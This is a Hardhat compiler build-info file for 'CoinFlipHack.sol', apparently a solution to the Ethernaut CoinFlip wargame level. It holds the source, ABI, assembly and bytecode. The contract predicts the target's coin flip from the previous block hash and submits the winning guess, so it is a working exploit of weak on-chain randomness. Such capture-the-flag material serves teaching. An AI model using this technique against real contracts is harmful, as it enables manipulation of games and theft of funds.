{
	"id": "5253534bb0ea88196f0124062b31901b",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.18",
	"solcLongVersion": "0.8.18+commit.87f61d96",
	"input": {
		"language": "Solidity",
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		},
		"sources": {
			"ethernaut/CoinFlipHack.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\ninterface CoinFlip {\n      function flip(bool _guess) external returns (bool);\n}\n\ncontract CoinFlipHack {\n     uint256 lastHash;\n     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n     CoinFlip coinFlipContract;\n\n    constructor (address _coinFlip) {\n        coinFlipContract = CoinFlip(_coinFlip);\n    }\n\n    function flipHack() external returns(bool){\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n    return coinFlipContract.flip(side);\n    }\n}"
			}
		}
	},
	"output": {
		"contracts": {
			"ethernaut/CoinFlipHack.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut/CoinFlipHack.sol\":\"CoinFlip\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut/CoinFlipHack.sol\":{\"keccak256\":\"0x794cafacb66f330aa080a1ba5c6457fd1d450e3d9048cbaed0b5dbe0b0d0c7b4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://9074dd55fbd0d9ebf153cec2e40f616b3fcdd445a67b42031a3f92189db0b2ac\",\"dweb:/ipfs/QmYDoCMRgn5kZS4TXBWg6cSBM8juCvMqqjbviowsfVBnxA\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"CoinFlipHack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_coinFlip",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "flipHack",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut/CoinFlipHack.sol\":140:765  contract CoinFlipHack {... */\n  mstore(0x40, 0x80)\n  shl(0xff, 0x01)\n    /* \"ethernaut/CoinFlipHack.sol\":192:286  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x01\n  sstore\n    /* \"ethernaut/CoinFlipHack.sol\":325:412  constructor (address _coinFlip) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"ethernaut/CoinFlipHack.sol\":367:383  coinFlipContract */\n  0x02\n    /* \"ethernaut/CoinFlipHack.sol\":367:405  coinFlipContract = CoinFlip(_coinFlip) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"ethernaut/CoinFlipHack.sol\":140:765  contract CoinFlipHack {... */\n  jump(tag_7)\n    /* \"#utility.yul\":14:304   */\ntag_3:\n    /* \"#utility.yul\":84:90   */\n  0x00\n    /* \"#utility.yul\":137:139   */\n  0x20\n    /* \"#utility.yul\":125:134   */\n  dup3\n    /* \"#utility.yul\":116:123   */\n  dup5\n    /* \"#utility.yul\":112:135   */\n  sub\n    /* \"#utility.yul\":108:140   */\n  slt\n    /* \"#utility.yul\":105:157   */\n  iszero\n  tag_9\n  jumpi\n    /* \"#utility.yul\":153:154   */\n  0x00\n    /* \"#utility.yul\":150:151   */\n  dup1\n    /* \"#utility.yul\":143:155   */\n  revert\n    /* \"#utility.yul\":105:157   */\ntag_9:\n    /* \"#utility.yul\":179:195   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":224:255   */\n  dup2\n  and\n    /* \"#utility.yul\":214:256   */\n  dup2\n  eq\n    /* \"#utility.yul\":204:274   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":270:271   */\n  0x00\n    /* \"#utility.yul\":267:268   */\n  dup1\n    /* \"#utility.yul\":260:272   */\n  revert\n    /* \"#utility.yul\":204:274   */\ntag_10:\n    /* \"#utility.yul\":293:298   */\n  swap4\n    /* \"#utility.yul\":14:304   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\ntag_7:\n    /* \"ethernaut/CoinFlipHack.sol\":140:765  contract CoinFlipHack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut/CoinFlipHack.sol\":140:765  contract CoinFlipHack {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xcb80c044\n      eq\n      tag_3\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut/CoinFlipHack.sol\":418:763  function flipHack() external returns(bool){... */\n    tag_3:\n      tag_4\n      tag_5\n      jump\t// in\n    tag_4:\n      mload(0x40)\n        /* \"#utility.yul\":179:193   */\n      swap1\n      iszero\n        /* \"#utility.yul\":172:194   */\n      iszero\n        /* \"#utility.yul\":154:195   */\n      dup2\n      mstore\n        /* \"#utility.yul\":142:144   */\n      0x20\n        /* \"#utility.yul\":127:145   */\n      add\n        /* \"ethernaut/CoinFlipHack.sol\":418:763  function flipHack() external returns(bool){... */\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_5:\n        /* \"ethernaut/CoinFlipHack.sol\":455:459  bool */\n      0x00\n      dup1\n        /* \"ethernaut/CoinFlipHack.sol\":509:525  block.number - 1 */\n      tag_9\n        /* \"ethernaut/CoinFlipHack.sol\":524:525  1 */\n      0x01\n        /* \"ethernaut/CoinFlipHack.sol\":509:521  block.number */\n      number\n        /* \"ethernaut/CoinFlipHack.sol\":509:525  block.number - 1 */\n      tag_10\n      jump\t// in\n    tag_9:\n        /* \"ethernaut/CoinFlipHack.sol\":499:526  blockhash(block.number - 1) */\n      blockhash\n        /* \"ethernaut/CoinFlipHack.sol\":491:527  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"ethernaut/CoinFlipHack.sol\":470:527  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"ethernaut/CoinFlipHack.sol\":554:564  blockValue */\n      dup1\n        /* \"ethernaut/CoinFlipHack.sol\":542:550  lastHash */\n      sload(0x00)\n        /* \"ethernaut/CoinFlipHack.sol\":542:564  lastHash == blockValue */\n      sub\n        /* \"ethernaut/CoinFlipHack.sol\":538:599  if (lastHash == blockValue) {... */\n      tag_11\n      jumpi\n        /* \"ethernaut/CoinFlipHack.sol\":580:588  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernaut/CoinFlipHack.sol\":538:599  if (lastHash == blockValue) {... */\n    tag_11:\n        /* \"ethernaut/CoinFlipHack.sol\":605:613  lastHash */\n      0x00\n        /* \"ethernaut/CoinFlipHack.sol\":605:626  lastHash = blockValue */\n      dup2\n      dup2\n      sstore\n        /* \"ethernaut/CoinFlipHack.sol\":664:670  FACTOR */\n      sload(0x01)\n        /* \"ethernaut/CoinFlipHack.sol\":651:670  blockValue / FACTOR */\n      tag_12\n      swap1\n        /* \"ethernaut/CoinFlipHack.sol\":616:626  blockValue */\n      dup4\n        /* \"ethernaut/CoinFlipHack.sol\":651:670  blockValue / FACTOR */\n      tag_13\n      jump\t// in\n    tag_12:\n        /* \"ethernaut/CoinFlipHack.sol\":632:670  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"ethernaut/CoinFlipHack.sol\":676:685  bool side */\n      0x00\n        /* \"ethernaut/CoinFlipHack.sol\":688:696  coinFlip */\n      dup2\n        /* \"ethernaut/CoinFlipHack.sol\":700:701  1 */\n      0x01\n        /* \"ethernaut/CoinFlipHack.sol\":688:701  coinFlip == 1 */\n      eq\n        /* \"ethernaut/CoinFlipHack.sol\":688:716  coinFlip == 1 ? true : false */\n      tag_14\n      jumpi\n        /* \"ethernaut/CoinFlipHack.sol\":711:716  false */\n      0x00\n        /* \"ethernaut/CoinFlipHack.sol\":688:716  coinFlip == 1 ? true : false */\n      jump(tag_15)\n    tag_14:\n        /* \"ethernaut/CoinFlipHack.sol\":704:708  true */\n      0x01\n        /* \"ethernaut/CoinFlipHack.sol\":688:716  coinFlip == 1 ? true : false */\n    tag_15:\n        /* \"ethernaut/CoinFlipHack.sol\":729:745  coinFlipContract */\n      sload(0x02)\n        /* \"ethernaut/CoinFlipHack.sol\":729:756  coinFlipContract.flip(side) */\n      mload(0x40)\n      shl(0xe0, 0x1d263f67)\n      dup2\n      mstore\n        /* \"#utility.yul\":179:193   */\n      dup3\n      iszero\n        /* \"#utility.yul\":172:194   */\n      iszero\n        /* \"ethernaut/CoinFlipHack.sol\":729:756  coinFlipContract.flip(side) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":154:195   */\n      mstore\n        /* \"ethernaut/CoinFlipHack.sol\":676:716  bool side = coinFlip == 1 ? true : false */\n      swap2\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ethernaut/CoinFlipHack.sol\":729:745  coinFlipContract */\n      and\n      swap1\n        /* \"ethernaut/CoinFlipHack.sol\":729:750  coinFlipContract.flip */\n      0x1d263f67\n      swap1\n        /* \"#utility.yul\":127:145   */\n      0x24\n      add\n        /* \"ethernaut/CoinFlipHack.sol\":729:756  coinFlipContract.flip(side) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"ethernaut/CoinFlipHack.sol\":722:756  return coinFlipContract.flip(side) */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"ethernaut/CoinFlipHack.sol\":418:763  function flipHack() external returns(bool){... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":206:431   */\n    tag_10:\n        /* \"#utility.yul\":273:282   */\n      dup2\n      dup2\n      sub\n        /* \"#utility.yul\":294:305   */\n      dup2\n      dup2\n      gt\n        /* \"#utility.yul\":291:425   */\n      iszero\n      tag_24\n      jumpi\n        /* \"#utility.yul\":347:357   */\n      0x4e487b71\n        /* \"#utility.yul\":342:345   */\n      0xe0\n        /* \"#utility.yul\":338:358   */\n      shl\n        /* \"#utility.yul\":335:336   */\n      0x00\n        /* \"#utility.yul\":328:359   */\n      mstore\n        /* \"#utility.yul\":382:386   */\n      0x11\n        /* \"#utility.yul\":379:380   */\n      0x04\n        /* \"#utility.yul\":372:387   */\n      mstore\n        /* \"#utility.yul\":410:414   */\n      0x24\n        /* \"#utility.yul\":407:408   */\n      0x00\n        /* \"#utility.yul\":400:415   */\n      revert\n        /* \"#utility.yul\":291:425   */\n    tag_24:\n        /* \"#utility.yul\":206:431   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":436:653   */\n    tag_13:\n        /* \"#utility.yul\":476:477   */\n      0x00\n        /* \"#utility.yul\":502:503   */\n      dup3\n        /* \"#utility.yul\":492:624   */\n      tag_26\n      jumpi\n        /* \"#utility.yul\":546:556   */\n      0x4e487b71\n        /* \"#utility.yul\":541:544   */\n      0xe0\n        /* \"#utility.yul\":537:557   */\n      shl\n        /* \"#utility.yul\":534:535   */\n      0x00\n        /* \"#utility.yul\":527:558   */\n      mstore\n        /* \"#utility.yul\":581:585   */\n      0x12\n        /* \"#utility.yul\":578:579   */\n      0x04\n        /* \"#utility.yul\":571:586   */\n      mstore\n        /* \"#utility.yul\":609:613   */\n      0x24\n        /* \"#utility.yul\":606:607   */\n      0x00\n        /* \"#utility.yul\":599:614   */\n      revert\n        /* \"#utility.yul\":492:624   */\n    tag_26:\n      pop\n        /* \"#utility.yul\":638:647   */\n      div\n      swap1\n        /* \"#utility.yul\":436:653   */\n      jump\t// out\n        /* \"#utility.yul\":658:935   */\n    tag_20:\n        /* \"#utility.yul\":725:731   */\n      0x00\n        /* \"#utility.yul\":778:780   */\n      0x20\n        /* \"#utility.yul\":766:775   */\n      dup3\n        /* \"#utility.yul\":757:764   */\n      dup5\n        /* \"#utility.yul\":753:776   */\n      sub\n        /* \"#utility.yul\":749:781   */\n      slt\n        /* \"#utility.yul\":746:798   */\n      iszero\n      tag_28\n      jumpi\n        /* \"#utility.yul\":794:795   */\n      0x00\n        /* \"#utility.yul\":791:792   */\n      dup1\n        /* \"#utility.yul\":784:796   */\n      revert\n        /* \"#utility.yul\":746:798   */\n    tag_28:\n        /* \"#utility.yul\":826:835   */\n      dup2\n        /* \"#utility.yul\":820:836   */\n      mload\n        /* \"#utility.yul\":879:884   */\n      dup1\n        /* \"#utility.yul\":872:885   */\n      iszero\n        /* \"#utility.yul\":865:886   */\n      iszero\n        /* \"#utility.yul\":858:863   */\n      dup2\n        /* \"#utility.yul\":855:887   */\n      eq\n        /* \"#utility.yul\":845:905   */\n      tag_29\n      jumpi\n        /* \"#utility.yul\":901:902   */\n      0x00\n        /* \"#utility.yul\":898:899   */\n      dup1\n        /* \"#utility.yul\":891:903   */\n      revert\n        /* \"#utility.yul\":845:905   */\n    tag_29:\n        /* \"#utility.yul\":924:929   */\n      swap4\n        /* \"#utility.yul\":658:935   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a1b2bdeac39cf64cb37fc77ae4da0b6b79487347dd5ad7c15ecc72ff72ca47ba64736f6c63430008120033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_29": {
									"entryPoint": null,
									"id": 29,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_tuple_t_address_fromMemory": {
									"entryPoint": 92,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:306:1",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:1",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "95:209:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "141:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "150:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "153:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "143:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "143:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "143:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "116:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "125:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "112:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "112:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "137:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "108:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:32:1"
															},
															"nodeType": "YulIf",
															"src": "105:52:1"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "166:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "185:9:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "179:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "179:16:1"
															},
															"variables": [
																{
																	"name": "value",
																	"nodeType": "YulTypedName",
																	"src": "170:5:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "258:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "267:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "270:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "260:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "260:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "260:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "217:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "228:5:1"
																					},
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "243:3:1",
																										"type": "",
																										"value": "160"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "248:1:1",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "239:3:1"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "239:11:1"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "252:1:1",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "sub",
																							"nodeType": "YulIdentifier",
																							"src": "235:3:1"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "235:19:1"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "224:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "224:31:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "214:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "214:42:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "207:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "207:50:1"
															},
															"nodeType": "YulIf",
															"src": "204:70:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "283:15:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "293:5:1"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "283:6:1"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "61:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "72:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "84:6:1",
														"type": ""
													}
												],
												"src": "14:290:1"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n        value0 := value\n    }\n}",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "6080604052600160ff1b60015534801561001857600080fd5b506040516102523803806102528339810160408190526100379161005c565b600280546001600160a01b0319166001600160a01b039290921691909117905561008c565b60006020828403121561006e57600080fd5b81516001600160a01b038116811461008557600080fd5b9392505050565b6101b78061009b6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cb80c04414610030575b600080fd5b61003861004c565b604051901515815260200160405180910390f35b60008061005a60014361010f565b4060001c9050806000540361006e57600080fd5b60008181556001546100809083610136565b9050600081600114610093576000610096565b60015b600254604051631d263f6760e01b815282151560048201529192506001600160a01b031690631d263f67906024016020604051808303816000875af11580156100e3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101079190610158565b935050505090565b8181038181111561013057634e487b7160e01b600052601160045260246000fd5b92915050565b60008261015357634e487b7160e01b600052601260045260246000fd5b500490565b60006020828403121561016a57600080fd5b8151801515811461017a57600080fd5b939250505056fea2646970667358221220a1b2bdeac39cf64cb37fc77ae4da0b6b79487347dd5ad7c15ecc72ff72ca47ba64736f6c63430008120033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x1 PUSH1 0xFF SHL PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x18 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x252 CODESIZE SUB DUP1 PUSH2 0x252 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x37 SWAP2 PUSH2 0x5C JUMP JUMPDEST PUSH1 0x2 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x8C JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x85 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x1B7 DUP1 PUSH2 0x9B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCB80C044 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4C JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x5A PUSH1 0x1 NUMBER PUSH2 0x10F JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x0 SLOAD SUB PUSH2 0x6E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 DUP2 SSTORE PUSH1 0x1 SLOAD PUSH2 0x80 SWAP1 DUP4 PUSH2 0x136 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 PUSH1 0x1 EQ PUSH2 0x93 JUMPI PUSH1 0x0 PUSH2 0x96 JUMP JUMPDEST PUSH1 0x1 JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x40 MLOAD PUSH4 0x1D263F67 PUSH1 0xE0 SHL DUP2 MSTORE DUP3 ISZERO ISZERO PUSH1 0x4 DUP3 ADD MSTORE SWAP2 SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x1D263F67 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x107 SWAP2 SWAP1 PUSH2 0x158 JUMP JUMPDEST SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST DUP2 DUP2 SUB DUP2 DUP2 GT ISZERO PUSH2 0x130 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH2 0x153 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP DIV SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD DUP1 ISZERO ISZERO DUP2 EQ PUSH2 0x17A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG1 0xB2 0xBD 0xEA 0xC3 SWAP13 0xF6 0x4C 0xB3 PUSH32 0xC77AE4DA0B6B79487347DD5AD7C15ECC72FF72CA47BA64736F6C634300081200 CALLER ",
							"sourceMap": "140:625:0:-:0;;;-1:-1:-1;;;192:94:0;;325:87;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;367:16;:38;;-1:-1:-1;;;;;;367:38:0;-1:-1:-1;;;;;367:38:0;;;;;;;;;;140:625;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;140:625:0;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@flipHack_79": {
									"entryPoint": 76,
									"id": 79,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 344,
									"id": null,
									"parameterSlots": 2,
